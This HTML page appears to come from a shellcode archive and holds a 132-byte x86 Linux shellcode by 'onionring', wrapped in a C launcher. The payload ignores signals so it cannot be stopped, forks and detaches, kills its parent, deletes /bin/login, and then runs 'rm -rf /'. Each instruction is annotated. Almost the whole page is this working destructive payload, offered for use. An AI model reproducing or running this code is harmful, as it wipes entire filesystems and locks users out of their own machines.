<html><head><title>Linux/x86 - rm -rf / which attempts to block the process from being stopped - 132 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
x86 linux rm -rf / which attempts to block the process from being stopped
132 bytes
written by onionring
*/

main()
{
 char shellcode[] =
&quot;\x31\xC0&quot;              // xor eax, eax
&quot;\x89\xC3&quot;              // mov ebx, eax
&quot;\x89\xC1&quot;              // mov ecx, eax
&quot;\x41&quot;                  // inc ecx
&quot;\xB0\x30&quot;              // mov al, 0x30 ; sys_signal
&quot;\xCD\x80&quot;              // int 0x80
&quot;\x31\xC0&quot;              // xor eax, eax
&quot;\xFE\xC3&quot;              // inc bl
&quot;\x80\xFB\x1F&quot;          // cmp bl, 0x1f
&quot;\x72\xF3&quot;              // jb 0xf3
&quot;\x04\x40&quot;              // add al, 0x40 ; sys_getppid
&quot;\xCD\x80&quot;              // int 0x80
&quot;\x89\xC2&quot;              // mov edx, eax
&quot;\x31\xC0&quot;              // xor eax, eax
&quot;\xB0\x02&quot;              // mov al, 0x2 ; sys_fork
&quot;\xCD\x80&quot;              // int 0x80
&quot;\x39\xC0&quot;              // cmp eax, eax
&quot;\x74\x08&quot;              // jnz 0x8
&quot;\x31\xC0&quot;              // xor eax, eax
&quot;\x89\xC3&quot;              // mov ebx, eax
&quot;\xB0\x01&quot;              // mov al, 0x1 ; sys_exit
&quot;\xCD\x80&quot;              // int 0x80
&quot;\x31\xC0&quot;              // xor eax, eax
&quot;\xB0\x42&quot;              // mov al, 0x42 ; sys_setsid
&quot;\xCD\x80&quot;              // int 0x80
&quot;\x43&quot;                  // inc ebx
&quot;\x39\xDA&quot;              // cmp edx, ebx
&quot;\x74\x08&quot;              // jz 0x8
&quot;\x89\xD3&quot;              // mov ebx, edx
&quot;\x31\xC0&quot;              // xor eax, eax
&quot;\x04\x25&quot;              // add al, 0x25 ; sys_kill
&quot;\xCD\x80&quot;              // int 0x80
&quot;\x31\xC0&quot;              // xor eax, eax
&quot;\x50&quot;                  // push eax
&quot;\x68\x6F\x67\x69\x6E&quot;  // push &quot;ogin&quot;
&quot;\x68\x69\x6E\x2F\x6C&quot;  // push &quot;in/l&quot;
&quot;\x68\x2F\x2F\x2F\x62&quot;  // push &quot;///b&quot;
&quot;\x89\xE3&quot;              // mov ebx, esp
&quot;\x31\xC0&quot;              // xor eax, eax
&quot;\x04\x0A&quot;              // add al, 0xa ; sys_unlink
&quot;\xCD\x80&quot;              // int 0x80
&quot;\x31\xC0&quot;              // xor eax, eax
&quot;\x50&quot;                  // push eax
&quot;\x68\x2F\x2F\x2F\x2F&quot;  // push &quot;////&quot;
&quot;\x89\xE2&quot;              // mov edx, esp
&quot;\x50&quot;                  // push eax
&quot;\x68\x2D\x72\x66\x66&quot;  // push &quot;-rff&quot;
&quot;\x89\xE1&quot;              // mov ecx, esp
&quot;\x50&quot;                  // push eax
&quot;\x68\x6E\x2F\x72\x6D&quot;  // push &quot;n/rm&quot;
&quot;\x68\x2F\x2F\x62\x69&quot;  // push &quot;//bi&quot;
&quot;\x89\xE3&quot;              // mov ebx, esp
&quot;\x50&quot;                  // push eax
&quot;\x52&quot;                  // push edx
&quot;\x51&quot;                  // push ecx
&quot;\x53&quot;                  // push ebx
&quot;\x89\xE1&quot;              // mov ecx, esp
&quot;\x31\xD2&quot;              // xor edx, edx
&quot;\x04\x0B&quot;              // add al, 0xb ; sys_execve
&quot;\xCD\x80&quot;;             // int 0x80

 (*(void (*)()) shellcode)();
}



<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
